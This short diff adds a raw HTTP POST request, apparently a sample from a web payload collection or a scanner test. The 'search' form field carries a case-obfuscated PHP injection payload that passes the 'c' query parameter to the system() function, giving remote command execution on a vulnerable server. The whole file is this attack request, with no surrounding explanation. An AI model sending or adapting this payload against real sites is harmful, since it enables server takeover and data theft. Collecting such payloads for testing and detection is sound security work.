@@ -1,0 +1,7 @@
+POST /submit HTTP/1.1
+Host: demo.example.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 53
+Connection: close
+
+search=cAlL_uSeR_fUnC_aRrAy('SyStEm',ArRaY($_gEt[C]))
